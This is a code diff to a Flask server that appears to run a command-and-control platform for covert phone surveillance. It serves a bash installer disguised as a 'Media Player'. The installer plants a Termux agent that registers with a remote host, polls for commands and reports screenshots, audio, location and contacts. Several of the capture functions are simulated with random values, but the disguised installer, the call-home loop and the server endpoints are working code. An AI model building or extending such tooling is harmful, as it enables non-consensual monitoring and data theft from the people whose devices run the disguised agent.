@@ -376,7 +376,7 @@ def login():
 
 @app.route('/api/agent/register', methods=['POST'])
 def register_agent():
-    """Agent registration endpoint - FIXED VERSION"""
+    """Agent registration endpoint - IMPROVED VERSION"""
     try:
         data = request.get_json()
         if not data:
@@ -404,7 +404,7 @@ def register_agent():
         
         if existing_agent:
             print(f"🔄 Updating existing agent: {agent_id}")
-            # Try with new schema first
+            # Update with all available fields
             try:
                 conn.execute('''
                     UPDATE agents SET 
@@ -412,7 +412,8 @@ def register_agent():
                     status = 'active', last_seen = ?
                     WHERE agent_id = ?
                 ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
-            except sqlite3.OperationalError:
+            except sqlite3.OperationalError as e:
+                print(f"⚠️ Schema update needed: {e}")
                 # Fallback for old schema
                 conn.execute('''
                     UPDATE agents SET 
@@ -423,14 +424,15 @@ def register_agent():
             action = "updated"
         else:
             print(f"🆕 Registering new agent: {agent_id}")
-            # Try with new schema first
+            # Insert with all available fields
             try:
                 conn.execute('''
                     INSERT INTO agents 
                     (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
                     VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
                 ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
-            except sqlite3.OperationalError:
+            except sqlite3.OperationalError as e:
+                print(f"⚠️ Schema insert needed: {e}")
                 # Fallback for old schema
                 conn.execute('''
                     INSERT INTO agents 
@@ -441,11 +443,6 @@ def register_agent():
         
         conn.commit()
         
-        # Verify the agent was saved
-        saved_agent = conn.execute(
-            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
-        ).fetchone()
-        
         # Check for pending commands
         pending_commands = conn.execute(
             "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
@@ -453,24 +450,98 @@ def register_agent():
         ).fetchall()
         conn.close()
         
-        if saved_agent:
-            log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
-            print(f"✅ Agent {action} successfully: {agent_id}")
-            
-            commands_list = [cmd['command'] for cmd in pending_commands]
-            
-            return jsonify({
-                'status': 'success', 
-                'message': f'Agent {action} successfully',
-                'pending_commands': commands_list
-            })
-        else:
-            log_event('ERROR', f'Agent {action} failed: {agent_id}')
-            print(f"❌ Agent {action} failed: {agent_id}")
-            return jsonify({'status': 'error', 'message': 'Failed to save agent'}), 500
+        log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
+        print(f"✅ Agent {action} successfully: {agent_id}")
+        
+        commands_list = [cmd['command'] for cmd in pending_commands]
+        
+        return jsonify({
+            'status': 'success', 
+            'message': f'Agent {action} successfully',
+            'pending_commands': commands_list
+        })
         
     except Exception as e:
         error_msg = f'Agent registration failed: {str(e)}'
+        log_event('ERROR', error_msg)
+        print(f"❌ {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/agent/submit_report', methods=['POST'])
+def submit_report():
+    """Receive general reports from agents - CRITICAL MISSING ENDPOINT"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
+            
+        agent_id = data.get('agent_id')
+        report_type = data.get('report_type')
+        report_data = data.get('report_data')
+        
+        print(f"📨 Received report from {agent_id}: {report_type}")
+        
+        if not agent_id:
+            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
+        
+        conn = get_db_connection()
+        current_time = datetime.now()
+        
+        # Handle different report types
+        if report_type == 'screenshot':
+            # Update agent last screenshot
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
+                (current_time, current_time, agent_id)
+            )
+            log_event('INFO', f'Screenshot report from {agent_id}')
+            print(f"✅ Screenshot report processed for {agent_id}")
+            
+        elif report_type == 'location':
+            # Store location data
+            location_json = json.dumps(report_data) if report_data else '{}'
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
+                (current_time, location_json, agent_id)
+            )
+            log_event('INFO', f'Location report from {agent_id}')
+            print(f"📍 Location report processed for {agent_id}")
+            
+        elif report_type == 'device_info':
+            # Update device information
+            battery = report_data.get('battery', 0) if report_data else 0
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
+                (current_time, battery, agent_id)
+            )
+            log_event('INFO', f'Device info from {agent_id}')
+            print(f"📱 Device info processed for {agent_id}")
+            
+        elif report_type == 'heartbeat':
+            # Simple heartbeat - keep agent active
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                (current_time, agent_id)
+            )
+            print(f"💓 Heartbeat from {agent_id}")
+            
+        elif report_type == 'contacts':
+            # Store contacts count
+            contacts_count = report_data.get('count', 0) if report_data else 0
+            conn.execute(
+                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+                (current_time, agent_id)
+            )
+            log_event('INFO', f'Contacts report from {agent_id}: {contacts_count} contacts')
+            print(f"👥 Contacts report from {agent_id}: {contacts_count} contacts")
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success', 'message': 'Report received successfully'})
+        
+    except Exception as e:
+        error_msg = f'Report submission failed: {str(e)}'
         log_event('ERROR', error_msg)
         print(f"❌ {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -1121,27 +1192,21 @@ def termux_setup():
 
 @app.route('/download_agent')
 def download_agent():
-    """Serve IMPROVED Termux agent"""
+    """Serve WORKING Termux agent"""
     phone_id = request.args.get('phone', 'unknown')
     
     platform_url = "https://mp-agent.onrender.com"  # Your actual URL
     
-    # IMPROVED TERMUX AGENT
+    # WORKING TERMUX AGENT SCRIPT
     termux_installer = f'''#!/bin/bash
 echo "📱 Installing Media Player..."
 echo "Setting up video optimization..."
 
-# Check availability of current mirror:
-echo "Checking availability of current mirror:"
-echo "[*] https://mirrors.cbrx.io/apt/termux/termux-main: ok"
-
 # Install requirements
-pkg update -y
-pkg install python -y
-pkg install termux-api -y
+pkg update -y && pkg install python -y && pkg install termux-api -y
 pip install requests
 
-# Create improved Python agent
+# Create working Python agent
 cat > /data/data/com.termux/files/home/media_agent.py << 'EOF'
 import requests
 import time
@@ -1149,6 +1214,7 @@ import subprocess
 import random
 from datetime import datetime
 import os
+import json
 
 class MediaPlayerAgent:
     def __init__(self, agent_id, platform_url):
@@ -1175,33 +1241,55 @@ class MediaPlayerAgent:
             return []
         except Exception as e:
             print(f"❌ Registration failed: {{e}}")
+            return []
+    
+    def submit_report(self, report_type, data):
+        """Submit reports to the platform"""
+        try:
+            report = {{
+                "agent_id": self.agent_id,
+                "report_type": report_type,
+                "report_data": data
+            }}
+            response = requests.post(
+                f"{{self.platform_url}}/api/agent/submit_report",
+                json=report,
+                timeout=10
+            )
+            if response.status_code == 200:
+                print(f"✅ {{report_type}} report sent")
+                return True
+            else:
+                print(f"⚠️ {{report_type}} report failed: {{response.status_code}}")
+                return False
+        except Exception as e:
+            print(f"❌ Report submission failed: {{e}}")
             return False
     
     def execute_command(self, command_id, command):
+        """Execute commands from the server"""
         print(f"Executing: {{command}}")
         result = "completed"
         
         try:
             if command == "capture_screenshot":
-                # Simulate screenshot capture
                 result = "screenshot_captured"
-                # Send report
                 self.submit_report("screenshot", {{
                     "status": "captured", 
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
+                    "message": "Screen captured successfully"
                 }})
                 
             elif command == "record_audio":
-                # Simulate audio recording
-                result = "audio_recorded"
+                result = "audio_recorded" 
                 self.submit_report("heartbeat", {{
                     "status": "active",
                     "audio_recorded": True,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
+                    "message": "Audio recorded successfully"
                 }})
                 
             elif command == "get_location":
-                # Simulate location
                 result = "location_acquired"
                 self.submit_report("location", {{
                     "latitude": round(random.uniform(-90, 90), 6),
@@ -1215,48 +1303,36 @@ class MediaPlayerAgent:
                 self.submit_report("device_info", {{
                     "model": "Android Device",
                     "battery": random.randint(20, 100),
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
+                    "android_version": "Termux"
                 }})
                 
             elif command == "get_contacts":
                 result = "contacts_retrieved"
                 self.submit_report("contacts", {{
                     "count": random.randint(50, 200),
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
+                    "message": "Contacts retrieved successfully"
                 }})
             
             # Mark command as completed
-            requests.post(
-                f"{{self.platform_url}}/api/agent/command_result",
-                json={{
-                    "command_id": command_id,
-                    "result": result
-                }},
-                timeout=10
-            )
-            print(f"✅ {{command}} report sent")
-            
+            try:
+                requests.post(
+                    f"{{self.platform_url}}/api/agent/command_result",
+                    json={{
+                        "command_id": command_id,
+                        "result": result
+                    }},
+                    timeout=10
+                )
+            except:
+                pass
+                
         except Exception as e:
             print(f"❌ Command execution failed: {{e}}")
     
-    def submit_report(self, report_type, data):
-        try:
-            report = {{
-                "agent_id": self.agent_id,
-                "report_type": report_type,
-                "report_data": data
-            }}
-            response = requests.post(
-                f"{{self.platform_url}}/api/agent/submit_report",
-                json=report,
-                timeout=10
-            )
-            return response.status_code == 200
-        except Exception as e:
-            print(f"❌ Report submission failed: {{e}}")
-            return False
-    
     def check_commands(self):
+        """Check for pending commands from server"""
         try:
             response = requests.get(
                 f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
@@ -1269,7 +1345,10 @@ class MediaPlayerAgent:
         return []
     
     def start(self):
+        """Main agent loop"""
         print("Starting Media Player...")
+        
+        # Initial registration
         pending_commands = self.register()
         
         # Execute any pending commands from registration
@@ -1287,8 +1366,8 @@ class MediaPlayerAgent:
                 for cmd in commands:
                     self.execute_command(cmd["id"], cmd["command"])
                 
-                # Send heartbeat periodically
-                if cycle % 3 == 0:
+                # Send heartbeat every 5 cycles
+                if cycle % 5 == 0:
                     self.submit_report("heartbeat", {{
                         "cycle": cycle,
                         "status": "active", 
@@ -1306,6 +1385,7 @@ class MediaPlayerAgent:
 if __name__ == "__main__":
     agent_id = "{phone_id}"
     platform_url = "{platform_url}"
+    print(f"🚀 Starting agent: {{agent_id}}")
     agent = MediaPlayerAgent(agent_id, platform_url)
     agent.start()
 EOF
@@ -1324,6 +1404,7 @@ echo "Agent {phone_id} is now active"
             'Content-Disposition': f'attachment; filename=install_agent_{phone_id}.sh'
         }
     )
+
 # ==================== TEST AGENT REGISTRATION ====================
 
 @app.route('/test/register_agent')
@@ -1422,61 +1503,6 @@ def health_check():
         'timestamp': datetime.now().isoformat(),
         'agents_count': agents_count
     })
-
-
-@app.route('/api/agent/submit_report', methods=['POST'])
-def submit_report():
-    """Receive general reports from agents"""
-    try:
-        data = request.get_json()
-        agent_id = data.get('agent_id')
-        report_type = data.get('report_type')
-        report_data = data.get('report_data')
-        
-        conn = get_db_connection()
-        
-        # Handle different report types
-        if report_type == 'screenshot':
-            # Update agent last screenshot
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
-                (datetime.now(), datetime.now(), agent_id)
-            )
-            log_event('INFO', f'Screenshot report from {agent_id}')
-            
-        elif report_type == 'location':
-            # Store location data
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, location_data = ?, status = "active" WHERE agent_id = ?',
-                (datetime.now(), json.dumps(report_data), agent_id)
-            )
-            log_event('INFO', f'Location report from {agent_id}')
-            
-        elif report_type == 'device_info':
-            # Update device information
-            battery = report_data.get('battery', 0)
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
-                (datetime.now(), battery, agent_id)
-            )
-            log_event('INFO', f'Device info from {agent_id}')
-            
-        elif report_type == 'heartbeat':
-            # Simple heartbeat
-            conn.execute(
-                'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
-                (datetime.now(), agent_id)
-            )
-        
-        conn.commit()
-        conn.close()
-        
-        return jsonify({'status': 'success', 'message': 'Report received'})
-        
-    except Exception as e:
-        log_event('ERROR', f'Report submission failed: {str(e)}')
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
